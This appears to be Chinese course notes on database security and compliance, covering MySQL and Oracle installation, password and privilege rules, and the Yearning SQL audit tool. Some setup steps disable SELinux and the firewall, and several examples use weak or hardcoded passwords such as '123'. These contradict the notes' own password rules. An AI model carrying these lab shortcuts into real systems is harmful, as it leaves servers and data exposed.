title="1.什么是数据？"></a>1.什么是数据？</h3><blockquote><p>​数据是指对客观事件进行记录并可以鉴别的符号，是对客观事物的性质、状态以及相互关系等进行记载的物理符号或这些物理符号的组合。它是可识别的、抽象的符号。</p><p>​它不仅指狭义上的数字，还可以是具有一定意义的文字、字母、数字符号的组合、图形、图像、视频、音频等，也是客观事物的属性、数量、位置及其相互关系的抽象表示。例如，“0、1、2…”、“阴、雨、下降、气温”、“学生的档案记录、货物的运输情况”等都是数据。数据经过加工后就成为信息。</p><p>​在计算机科学，数据是所有能输入计算机并被计算机程序处理的符号的介质的总称，是用于输入电子计算机进行处理，具有一定意义的数字、字母、符号和模拟量等的通称。计算机存储和处理的对象十分广泛，表示这些对象的数据也随之变得越来越复杂。</p></blockquote><h3 id="2-什么是数据库管理系统（DBMS）？"><a href="#2-什么是数据库管理系统（DBMS）？" class="headerlink" title="2.什么是数据库管理系统（DBMS）？"></a>2.什么是数据库管理系统（DBMS）？</h3><blockquote><p>用来存储、管理、应用数据的软件。</p></blockquote><h3 id="4-主流数据库产品和厂商有哪些？"><a href="#4-主流数据库产品和厂商有哪些？" class="headerlink" title="4.主流数据库产品和厂商有哪些？"></a>4.主流数据库产品和厂商有哪些？</h3><h3 id="5-该从哪些方面保证数据库安全？"><a href="#5-该从哪些方面保证数据库安全？" class="headerlink" title="5.该从哪些方面保证数据库安全？"></a>5.该从哪些方面保证数据库安全？</h3><h2 id="第二章-基础环境准备"><a href="#第二章-基础环境准备" class="headerlink" title="第二章 基础环境准备"></a>第二章 基础环境准备</h2><h3 id="1-MySQL-部署"><a href="#1-MySQL-部署" class="headerlink" title="1.MySQL 部署"></a>1.MySQL 部署</h3><h4 id="1-1-确认支持列表：Supported-Platforms"><a href="#1-1-确认支持列表：Supported-Platforms" class="headerlink" title="1.1 确认支持列表：Supported Platforms"></a>1.1 确认支持列表：Supported Platforms</h4><table><thead><tr><th></th><th></th><th>8.0</th><th>5.7</th><th>5.6</th></tr></thead><tbody><tr><td>Operating System</td><td>Architecture</td><td></td><td></td><td></td></tr><tr><td>Oracle Linux / Red Hat / CentOS</td><td></td><td></td><td></td><td></td></tr><tr><td>Oracle Linux 8 / Red Hat Enterprise Linux 8 / CentOS 8</td><td>x86_64, ARM 64</td><td>•</td><td></td><td></td></tr><tr><td>Oracle Linux 7 / Red Hat Enterprise Linux 7 / CentOS 7</td><td>ARM 64</td><td>•</td><td></td><td></td></tr><tr><td>Oracle Linux 7 / Red Hat Enterprise Linux 7 / CentOS 7</td><td>x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Oracle Linux 6 / Red Hat Enterprise Linux 6 / CentOS 6</td><td>x86_32, x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Oracle Solaris</td><td></td><td></td><td></td><td></td></tr><tr><td>Solaris 11 (Update 4+)</td><td>SPARC_64, x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Solaris 10 (Update 11+)</td><td>SPARC_64, x86_32, x86_64</td><td></td><td></td><td>•</td></tr><tr><td>Canonical</td><td></td><td></td><td></td><td></td></tr><tr><td>Ubuntu 18.04 LTS</td><td>x86_32, x86_64</td><td>•</td><td>•</td><td></td></tr><tr><td>Ubuntu 16.04 LTS</td><td>x86_32, x86_64</td><td>•</td><td>•</td><td></td></tr><tr><td>SUSE</td><td></td><td></td><td></td><td></td></tr><tr><td>SUSE Enterprise Linux 15 / OpenSUSE 15</td><td>x86_64</td><td>•</td><td></td><td></td></tr><tr><td>SUSE Enterprise Linux 12 (12.3+)</td><td>x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Debian</td><td></td><td></td><td></td><td></td></tr><tr><td>Debian GNU/Linux 10</td><td>x86_64</td><td>•</td><td>•</td><td></td></tr><tr><td>Debian GNU/Linux 9</td><td>x86_32, x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Debian GNU/Linux 8</td><td>x86_32, x86_64</td><td></td><td>•</td><td>•</td></tr><tr><td>Microsoft Windows Server</td><td></td><td></td><td></td><td></td></tr><tr><td>Microsoft Windows 2019 Server</td><td>x86_64</td><td>•</td><td></td><td></td></tr><tr><td>Microsoft Windows 2016 Server</td><td>x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Microsoft Windows 2012 Server R2</td><td>x86_64</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Microsoft Windows</td><td></td><td></td><td></td><td></td></tr><tr><td>Microsoft Windows 10</td><td>x86_64</td><td>•</td><td>•</td><td></td></tr><tr><td>Apple</td><td></td><td></td><td></td><td></td></tr><tr><td>macOS 10.14</td><td>x86_64</td><td>•</td><td>•</td><td></td></tr><tr><td>macOS 10.13</td><td>x86_64</td><td>•</td><td>•</td><td></td></tr><tr><td>FreeBSD</td><td></td><td></td><td></td><td></td></tr><tr><td>FreeBSD 12</td><td>x86_64</td><td>•</td><td></td><td></td></tr><tr><td>Various Linux</td><td></td><td></td><td></td><td></td></tr><tr><td>Generic Linux (tar format)</td><td>x86_32, x86_64, glibc 2.12, libstdc++ 4.4</td><td>•</td><td>•</td><td>•</td></tr><tr><td><a href="https://dev.mysql.com/downloads/repo/yum/">Fedora Yum Repo</a></td><td>•</td><td>•</td><td>•</td><td></td></tr><tr><td><a href="https://dev.mysql.com/downloads/repo/apt/">Debian/Ubuntu APT Repo</a></td><td>•</td><td>•</td><td>•</td><td></td></tr><tr><td><a href="https://dev.mysql.com/downloads/repo/suse/">SUSE Repo</a></td><td>•</td><td>•</td><td>•</td><td></td></tr></tbody></table><blockquote><p>官网：</p><p><a href="https://www.mysql.com/support/supportedplatforms/database.html">https://www.mysql.com/support/supportedplatforms/database.html</a></p><p><a href="https://www.mysql.com/support/eol-notice.html">https://www.mysql.com/support/eol-notice.html</a></p></blockquote><h3 id="1-2-确认版本"><a href="#1-2-确认版本" class="headerlink" title="1.2 确认版本"></a>1.2 确认版本</h3><blockquote><p>​准备安装MySQL时，请确定要使用哪个版本和发行格式（二进制或源码）。</p><p>​首先，决定要安装开发版本还是通用版本（GA）。开发版本具有最新功能，但不建议用于生产环境。<br>GA版本（也称为生产版本或稳定版本）是供生产使用的。</p><p> MySQL 8.0中的命名方案使用的发行版名称由三个数字和一个可选的后缀组成（例如， <strong>mysql-8.0.1-dmr</strong>）。版本名称中的数字解释如下：</p><ul><li>第一个数字（<strong>8</strong>）是主版本号。</li><li>第二个数字（<strong>0</strong>）是次要版本号。总而言之，主要和次要数字构成发行版本号。序列号描述了稳定的功能集。</li><li>第三个数字（<strong>1</strong>）是发行系列中的版本号。对于每个新的错误修正版本，此值均递增。在大多数情况下，系列中的最新版本是最佳选择。<br>版本名称也可以包含一个后缀，以指示版本的稳定性。在一系列发行中，发布会通过一组后缀来指示稳定性水平如何提高。可能的后缀是：</li><li><strong>dmr</strong>指示开发里程碑版本（DMR）。MySQL开发使用里程碑模型，其中每个里程碑都引入了一小部分经过全面测试的功能。从一个里程碑到下一个里程碑，基于尝试这些正常发布的社区成员提供的反馈，功能界面可能会更改，甚至功能可能会被删除。里程碑版本中的功能可能被视为具有预生产质量。</li><li><strong>rc</strong>表示发布候选（RC）。通过了MySQL的所有内部测试后，发布候选版本被认为是稳定的。RC版本中可能仍会引入新功能，但是重点将转移到修复错误上，以稳定本系列中较早引入的功能。</li><li>没有后缀表示具有一般可用性（GA）或正式版。GA版本稳定，已成功通过了较早的发行阶段，并且被认为是可靠的，没有严重的错误并且适合在生产系统中使用。</li></ul></blockquote><h4 id="1-3-获取-MySQL软件"><a href="#1-3-获取-MySQL软件" class="headerlink" title="1.3 获取 MySQL软件"></a>1.3 获取 MySQL软件</h4><blockquote><p><a href="https://downloads.mysql.com/archives/community/">https://downloads.mysql.com/archives/community/</a></p><p>一定要到官网下载</p></blockquote><h4 id="1-4-MD5验证软件包"><a href="#1-4-MD5验证软件包" class="headerlink" title="1.4 MD5验证软件包"></a>1.4 MD5验证软件包</h4><blockquote><p>md5sum mysql-xxx.tar.gz<br>aaab65abbec64d5e907dcd41b8699945  mysql-xxx.tar.gz</p></blockquote><h4 id="1-5-企业上线准备"><a href="#1-5-企业上线准备" class="headerlink" title="1.5 企业上线准备"></a>1.5 企业上线准备</h4><h5 id="1-5-1-硬件标准化"><a href="#1-5-1-硬件标准化" class="headerlink" title="1.5.1  硬件标准化"></a>1.5.1  硬件标准化</h5><ul><li><p>标准化数据库专用服务器</p></li><li><p>标准化服务器硬件带来的收益</p></li></ul><h5 id="1-5-2-操作系统及配置标准化"><a href="#1-5-2-操作系统及配置标准化" class="headerlink" title="1.5.2 操作系统及配置标准化"></a>1.5.2 操作系统及配置标准化</h5><h5 id="1-5-3-标准化操作系统及硬件参数"><a href="#1-5-3-标准化操作系统及硬件参数" class="headerlink" title="1.5.3 标准化操作系统及硬件参数"></a>1.5.3 标准化操作系统及硬件参数</h5><ul><li><p>关闭NUMA</p></li><li><p>开启CPU高性能模式</p></li><li><p>阵列卡RAID配置</p></li><li><p>关闭THP</p></li><li><p>网卡绑定</p></li><li><p>存储多路径</p></li><li><p>系统层面参数调整</p></li></ul><h5 id="1-5-4-预装MySQL前硬件烤机压测"><a href="#1-5-4-预装MySQL前硬件烤机压测" class="headerlink" title="1.5.4 预装MySQL前硬件烤机压测"></a>1.5.4 预装MySQL前硬件烤机压测</h5><ul><li><p>stress 进行CPU、IO、MEM烤机压测</p></li><li><p>FIO 进行定制化IO烤机压测</p></li><li><p>sysbench进行综合压测</p></li></ul><h4 id="1-6-MySQL-8-0-x安装过程"><a href="#1-6-MySQL-8-0-x安装过程" class="headerlink" title="1.6 MySQL 8.0.x安装过程"></a>1.6 MySQL 8.0.x安装过程</h4><h5 id="1-6-1-安装准备"><a href="#1-6-1-安装准备" class="headerlink" title="1.6.1 安装准备"></a>1.6.1 安装准备</h5><pre class="line-numbers language-none"><code class="language-none">shell&gt; groupadd mysqlshell&gt; useradd  -s /bin/false mysqlshell&gt; cd /usr/localshell&gt; tar xvf /path/to/mysql-VERSION-OS.tar.xzshell&gt; xz -dc /path/to/mysql-VERSION-OS.tar.xz | tar xshell&gt; ln -s full-path-to-mysql-VERSION-OS mysqlshell&gt; export PATH=$PATH:/usr/local/mysql/binshell&gt; yum install libaio # install library  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-6-2-部署过程"><a href="#1-6-2-部署过程" class="headerlink" title="1.6.2 部署过程"></a>1.6.2 部署过程</h4><pre class="line-numbers language-none"><code class="language-none">shell&gt; cd mysqlshell&gt; mkdir mysql-filesshell&gt; chown mysql:mysql mysql-filesshell&gt; chmod 750 mysql-filesshell&gt;bin/mysqld --initialize --user=mysql  --basedir=/usr/local/mysql  --datadir=/data/mysql/data_3306shell&gt; bin/mysql_ssl_rsa_setupshell&gt; bin/mysqld_safe --user=mysql &amp;# Next command is optionalshell&gt; cp support-files/mysql.server /etc/init.d/mysql.server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-6-3-启动和关闭"><a href="#1-6-3-启动和关闭" class="headerlink" title="1.6.3 启动和关闭"></a>1.6.3 启动和关闭</h4><pre class="line-numbers language-none"><code class="language-none">shell&gt; bin/mysqld_safe --user=mysql &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-Oracle-部署"><a href="#2-Oracle-部署" class="headerlink" title="2.Oracle 部署"></a>2.Oracle 部署</h3><pre class="line-numbers language-none"><code class="language-none">环境准备:1.关闭NetworkManager [root@db01 ~]# systemctl stop NetworkManager[root@db01 ~]# systemctl disable NetworkManager2.修改网卡配置vim /etc/sysconfig/network-scripts/ifcfg-ens33TYPE="Ethernet"BOOTPROTO="static"DEFROUTE="yes"NAME="ens33"DEVICE="ens33"ONBOOT="yes"IPADDR=100.0.0.88NETMASK=255.255.255.0GATEWAY=100.0.0.254DNS1=223.5.5.5systemctl restart network3. 防火墙关闭selinux :[root@db01 ~]# getenforce Enforcing[root@db01 ~]# setenforce 0[root@db01 ~]# vim /etc/selinux/config # This file controls the state of SELinux on the system.# SELINUX= can take one of these three values:#     enforcing - SELinux security policy is enforced.#     permissive - SELinux prints warnings instead of enforcing.#     disabled - No SELinux policy is loaded.SELINUX=disabled# SELINUXTYPE= can take one of three values:#     targeted - Targeted processes are protected,#     minimum - Modification of targeted policy. Only selected processes are protected. #     mls - Multi Level Security protection.SELINUXTYPE=targetediptables :[root@db01 ~]# iptables -F[root@db01 ~]# systemctl disable firewalldRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.[root@db01 ~]# systemctl stop  firewalld4. 配置本地yum源[root@db01 ~]# cd /etc/yum.repos.d/[root@db01 yum.repos.d]# [root@db01 yum.repos.d]# lltotal 32-rw-r--r--. 1 root root 1664 Nov 23  2018 CentOS-Base.repo-rw-r--r--. 1 root root 1309 Nov 23  2018 CentOS-CR.repo-rw-r--r--. 1 root root  649 Nov 23  2018 CentOS-Debuginfo.repo-rw-r--r--. 1 root root  314 Nov 23  2018 CentOS-fasttrack.repo-rw-r--r--. 1 root root  630 Nov 23  2018 CentOS-Media.repo-rw-r--r--. 1 root root 1331 Nov 23  2018 CentOS-Sources.repo-rw-r--r--. 1 root root 5701 Nov 23  2018 CentOS-Vault.repo[root@db01 yum.repos.d]# mv * /tmp[root@db01 yum.repos.d]# ll[root@db01 yum.repos.d]# vim /etc/yum.repos.d/rhel-source.repo[rhel-source]name=local-isobaseurl=file:///mntenabled=1gpgchek=0挂载光盘镜像[root@db01 yum.repos.d]# mount /dev/sr0 /mnt[root@db01 yum.repos.d]# yum clean all======================================1、Oracle产品介绍1.1 Oracle版本说明7:  7.3.4 8i: 8.1.7  9i: 9.2.0.810g:10.2.0.4 10.2.0.5 11g:11.2.0.3  11.2.0.4    12c:12.2.0.1 18c:19c:企业现存版本:10g:10.2.0.4  10.2.0.5 11g:11.2.0.3  11.2.0.4    12c:12.2.0.1 18c:19c:1.2 Oracle工具网站oracle.com            ---&gt; 官网support.oracle.com    ---&gt; MOShttps://edelivery.oracle.com/osdc/faces/Home.jspx ---&gt;历史版本及补丁1.3 Oracle 软件release版本选择10gR2   11gR2   12cR21.4 Oracle 补丁类型Patch Set Release    PSRPatch Set Update     PSUCritical Patch Update CPU2012年10月，经更名为Security Patch Update (SPU)Interim Patch/One-Off Patc补丁应用方法和注意事项：&nbsp; &nbsp;以上的补丁除了psr直接使用runInstaller，其他的补丁类型都是使用opatch命令，在oracle 10g之前，我们需要单独下载此命令，到oracle 10g之后这个命令在 ORACLE_HOME/Opatch下，因此，最好在环境变量path中添加以下10.2.0.1   ----&gt; 升级成  10.2.0.5 11.2.0.1   ----&gt;         11.2.0.4 2. Oracle 11g安装2.0 Oracle11g软件包介绍database(RDBMS): 1of72of7 cluser软件(grid):3of7 : 集群功能,独立的存储功能(ASM)2.1. 检查内存，至少1Ggrep MemTotal /proc/meminfo2.2.交换分区    Available RAM            Swap Space Required     Between 1 GB and 2 GB    1.5 times the size of RAM     Between 2 GB and 16 GB   Equal to the size of RAM     More than 16 GB          16 GB grep "model name" /proc/cpuinfogrep SwapTotal /proc/meminfofreetotal       used       free     shared    buffers     cachedMem:       1035140     512924     522216          0      51236     335880-/+ buffers/cache:     125808     909332Swap:      1052248          0    10522482.3. 共享内存段至少要大于MEMORY_MAX_TARGET and MEMORY_TARGET df -k /dev/shm/Filesystem           1K-blocks      Used Available Use% Mounted ontmpfs                   517568         0    517568   0% /dev/shm2.4. 至少1G的 /tmpdf -h /tmp2.5. 数据库软件和data磁盘空间要求    Installation Type        Requirement for Software Files (GB)     Enterprise Edition        3.95     Standard Edition          3.88     Installation Type        Requirement for Data Files (GB)     Enterprise Edition        1.7     Standard Edition        1.5 2.6. 操作系统版本    Operating System Requirements    The following are the operating system requirements for Oracle Database 11g Release 2 (11.2) for Linux x86:    Asianux 2.0    Asianux 3.0    Oracle Enterprise Linux 4.0 Update 7 or later    Oracle Enterprise Linux 5.0    Red Hat Enterprise Linux 4.0 Update 7 or later    Red Hat Enterprise Linux 5.0    SUSE Linux Enterprise Server 10.0    SUSE Linux Enterprise Server 11.0    For Asianux 3, Oracle Enterprise Linux 5.0, and Red Hat Enterprise Linux 5.0: 2.6.18 or later2.7. 检查软件包The following or later version of packages for Asianux 3, Oracle Enterprise Linux 5.0, and Red Hat Enterprise Linux 5.0 should be installed:yum -y install binutils-*yum -y install compat-libstdc++-*yum -y install elfutils-libelf-*yum -y install elfutils-libelf-devel-*yum -y install elfutils-libelf-devel-static-*yum -y install gcc-*yum -y install gcc-c++-*yum -y install glibc-*yum -y install glibc-common-*yum -y install glibc-devel-*yum -y install glibc-headers-*yum -y install kernel-headers-*yum -y install ksh-*yum -y install libaio-*yum -y install libaio-devel-* yum -y install libgcc-*yum -y install libgomp-*yum -y install libstdc++-* yum -y install libstdc++-devel-*yum -y install make-*yum -y install sysstat-*yum -y install unixODBC-*yum -y install unixODBC-devel-*rpm -q --qf '%{NAME}-%{VERSION}-%{RELEASE} (%{ARCH})\n' binutils \compat-libstdc++ \elfutils-libelf-devel \elfutils-libelf-devel-static \gcc \gcc-c++ \glibc \glibc-common \glibc-devel \glibc-headers \kernel-headers \ksh \libaio \libaio-devel \libgcc \libgomp \libstdc++ \libstdc++-devel \make \sysstat \unixODBC \unixODBC-devel \libXp2.8. 创建组和用户/usr/sbin/groupadd oinstall/usr/sbin/groupadd dba/usr/sbin/useradd -g oinstall -G dba oracleecho oracle | passwd --stdin oracle2.9. 修改内核参数vim /etc/sysctl.conffs.aio-max-nr = 1048576fs.file-max = 6815744kernel.shmall = 2097152kernel.shmmax = 536870912kernel.shmmni = 4096kernel.sem = 250 32000 100 128net.ipv4.ip_local_port_range = 9000 65500net.core.rmem_default = 262144net.core.rmem_max = 4194304net.core.wmem_default = 262144net.core.wmem_max = 1048586sysctl -p2.10. 修改系统限制vim /etc/security/limits.conforacle           soft    nproc   2047oracle           hard    nproc   16384oracle           soft    nofile  1024oracle           hard    nofile  655362.11. vi /etc/pam.d/loginsession    required     pam_limits.so2.12. 修改profileif [ $USER = "oracle" ]; then        if [ $SHELL = "/bin/ksh" ]; then              ulimit -p 16384              ulimit -n 65536        else              ulimit -u 16384 -n 65536        fifi2.13. 创建目录结构分区:fdisk /dev/sda sda5  15G     ----&gt;/u01        ----&gt;本地   软件程序sda6  20G     ----&gt;/oradata    ----&gt;存储盘 数据存储mkfs.ext4 /dev/sda5 mkfs.ext4 /dev/sda6mkdir /u01  /oradatamount /dev/sda5 /u01mount /dev/sda6 /oradata[root@db08 ~]# blkid/dev/sda2: UUID="40852d80-1f81-469c-afe2-f3b84847467f" TYPE="ext4" /dev/sda1: UUID="a484cae0-ba65-4b19-91fb-8d23bdbcd118" TYPE="ext4" /dev/sda3: UUID="76380440-f2c6-4d7b-8343-044069196e2a" TYPE="swap" /dev/sda5: UUID="f76191bb-a035-41a4-94c4-2b005c468eba" TYPE="ext4" /dev/sda6: UUID="eb9cebaf-2ca0-4467-9476-b2d5f0cc9f0f" TYPE="ext4" vim /etc/fstabUUID="f76191bb-a035-41a4-94c4-2b005c468eba"  /u01 ext4 defaults 0 0 UUID="eb9cebaf-2ca0-4467-9476-b2d5f0cc9f0f" /oradata ext4 defaults 0 0 #创建必须目录:#ORACLE_BASE:存放各类日志mkdir -p /u01/app/oracle#ORACLE_HOME:存放程序的目录mkdir -p /u01/app/oracle/product/11.2.0/db_1#更改权限:chown -R oracle:oinstall /u01/chmod -R 775 /u01/chown -R oracle:oinstall /oradata #切换用户并更改环境变量文件su - oraclevim .bash_profileexport ORACLE_BASE=/u01/app/oracleexport ORACLE_HOME=/u01/app/oracle/product/11.2.0/db_1export ORACLE_SID=orclexport PATH=$ORACLE_HOME/bin:$PATHsource .bash_profile2.14. runInstaller2.15. netca2.16. dbca2.17. 基本链接使用sqlplus / as sysdba<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第三章-等保中MySQL-的安全保护"><a href="#第三章-等保中MySQL-的安全保护" class="headerlink" title="第三章 等保中MySQL 的安全保护"></a>第三章 等保中MySQL 的安全保护</h2><h3 id="1-等保中对于MySQL版本的要求"><a href="#1-等保中对于MySQL版本的要求" class="headerlink" title="1.等保中对于MySQL版本的要求"></a>1.等保中对于MySQL版本的要求</h3><pre><code>准备安装MySQL时，请确定要使用哪个版本和发行格式（二进制或源码）。首先，决定要安装开发版本还是通用版本（GA）。开发版本具有最新功能，但不建议用于生产环境。GA版本（也称为生产版本或稳定版本）是供生产使用的。一般使用GA版本（6-12月）。大约20个小版本</code></pre><h3 id="2-等保要求的中的数据库升级要求"><a href="#2-等保要求的中的数据库升级要求" class="headerlink" title="2.等保要求的中的数据库升级要求"></a>2.等保要求的中的数据库升级要求</h3><h3 id="3-等保要求中对于用户、权限要求"><a href="#3-等保要求中对于用户、权限要求" class="headerlink" title="3.等保要求中对于用户、权限要求"></a>3.等保要求中对于用户、权限要求</h3><h4 id="3-1-用户及密码管理"><a href="#3-1-用户及密码管理" class="headerlink" title="3.1 用户及密码管理"></a>3.1 用户及密码管理</h4><h5 id="3-1-1-用户定义"><a href="#3-1-1-用户定义" class="headerlink" title="3.1.1 用户定义"></a>3.1.1 用户定义</h5><blockquote><p>用户名@’白名单’   密码</p><p>用户名：由字母、数字、特殊符号组成的字符串</p><p>白名单：能够允许登录数据库的地址列表，可以是单个ip，网段，主机名，域名等。</p><p>oldguo@’localhost’   —-&gt; 只能在本地登录，一般管理员用户使用</p><p>oldguo@’10.0.0.55’   —-&gt; 只能此地址访问数据库，中间件中会使用</p><p>oldguo@’10.0.0.0/255.255.255.0’ —&gt; 1-254访问数据   </p><p>oldguo@’10.0.0.5%’  —-&gt; 50-59</p><p>oldguo@’10.0.%’</p><p>oldguo@’%’</p></blockquote><h5 id="3-1-2-等保中对于用户密码要求细则"><a href="#3-1-2-等保中对于用户密码要求细则" class="headerlink" title="3.1.2 等保中对于用户密码要求细则"></a>3.1.2 等保中对于用户密码要求细则</h5><pre class="line-numbers language-none"><code class="language-none">1. 用户密码需要12位以上2. 用户需要3种密码复杂度以上3. 用户需要90天密码过期设置4. 生产有人未经许可，索要root管理员密码需要及时上报5. 原则上不得将root管理员用户密码告知非管理员人员6. 禁用生产中无作用用户及已离职人员具备的用户7. 合理设置用户白名单，最小化连接主机列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-1-3-操作"><a href="#3-1-3-操作" class="headerlink" title="3.1.3 操作"></a>3.1.3 操作</h5><pre class="line-numbers language-none"><code class="language-none">mysql&gt; select user,host,authentication_string from mysql.user;mysql&gt; alter user root@'localhost' identified by 'Oldguo@22654481.com';mysql&gt; select user,host,plugin  from mysql.user\Gmysql&gt; alter user root@'localhost' identified with mysql_native_password by 'Oldguo@22654481.com';mysql&gt; select user,host ,password_expired from mysql.user;mysql&gt; create user oldguo@'10.0.0.%' identified with mysql_native_password by '123';mysql&gt; alter user oldguo@'10.0.0.%' password expire interval 90 day;mysql&gt; select user,host,password_lifetime  from mysql.user;mysql&gt; alter user oldguo@'10.0.0.%' password expire never;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-等保中权限管理"><a href="#3-2-等保中权限管理" class="headerlink" title="3.2 等保中权限管理"></a>3.2 等保中权限管理</h4><h4 id="3-2-1-等保中对于权限的管理"><a href="#3-2-1-等保中对于权限的管理" class="headerlink" title="3.2.1 等保中对于权限的管理"></a>3.2.1 等保中对于权限的管理</h4><pre class="line-numbers language-none"><code class="language-none">1. 最小化权限，专用户专用，细化权限2. 谨慎使用ALL权限3. 不在使用用户，及时回收权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-2-2-操作"><a href="#3-2-2-操作" class="headerlink" title="3.2.2 操作"></a>3.2.2 操作</h4><pre class="line-numbers language-none"><code class="language-none">mysql&gt; create user user_test@'10.0.0.%' identified with mysql_native_password by '123';mysql&gt; show privileges;mysql&gt; grant select,update,delete ,insert on test.* to user_test@'10.0.0.%';mysql&gt; show grants for user_test@'10.0.0.%';mysql&gt; revoke delete on test.* from user_test@'10.0.0.%'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-MySQL数据库的SQL安全审计"><a href="#4-MySQL数据库的SQL安全审计" class="headerlink" title="4.MySQL数据库的SQL安全审计"></a>4.MySQL数据库的SQL安全审计</h3><h4 id="4-1-SQL种类介绍"><a href="#4-1-SQL种类介绍" class="headerlink" title="4.1 SQL种类介绍"></a>4.1 SQL种类介绍</h4><pre class="line-numbers language-none"><code class="language-none">DDL 数据定义语言create drop alter DCL 数据控制语言grant revokeDML 数据操作语言selectupdatedeleteinsert <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-SQL书写规范"><a href="#4-2-SQL书写规范" class="headerlink" title="4.2 SQL书写规范"></a>4.2 SQL书写规范</h4><pre class="line-numbers language-none"><code class="language-none">参考阿里巴巴SQL规范。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-3-SQL安全审核平台–Yearning"><a href="#4-3-SQL安全审核平台–Yearning" class="headerlink" title="4.3 SQL安全审核平台–Yearning"></a>4.3 SQL安全审核平台–Yearning</h4><h4 id="4-3-0-功能介绍"><a href="#4-3-0-功能介绍" class="headerlink" title="4.3.0 功能介绍"></a>4.3.0 功能介绍</h4><blockquote><ul><li>SQL 查询<ul><li>查询工单</li><li>导出</li><li>自动补全，智能提示</li><li>查询语句审计</li><li>查询结果脱敏</li></ul></li><li>SQL 审核<ul><li>流程化工单</li><li>SQL语句语法检测</li><li>根据规则检测SQL语句合规性</li><li>自动生成DDL/DML回滚语句</li><li>历史审核记录</li></ul></li><li>推送<ul><li>E-mail 工单推送</li><li>钉钉 webhook 机器人工单推送</li></ul></li><li>用户权限及管理<ul><li>角色划分</li><li>基于用户的细粒度权限</li><li>注册</li></ul></li><li>其他<ul><li>todoList</li><li>LDAP 登录</li><li>动态审核规则配置</li><li>自定义审核层级</li></ul></li><li>AutoTask 自动执行</li></ul></blockquote><h4 id="4-3-1-Yearning工具部署"><a href="#4-3-1-Yearning工具部署" class="headerlink" title="4.3.1 Yearning工具部署"></a>4.3.1 Yearning工具部署</h4><pre class="line-numbers language-none"><code class="language-none"># 下载地址https://github.com/cookieY/Yearning/releases/tag/2.3.51. 配置文件设计# vim conf.toml [Mysql]Db = "Yearning"Host = "10.0.0.51"Port = "3306"Password = "Test123"User = "root"[General]SecretKey = "dbcjqheupqjsuwsm"Hours = 42. 初始化及安装./Yearning install3. 启动服务./Yearning run --push "10.0.0.60" --port "8000"4. 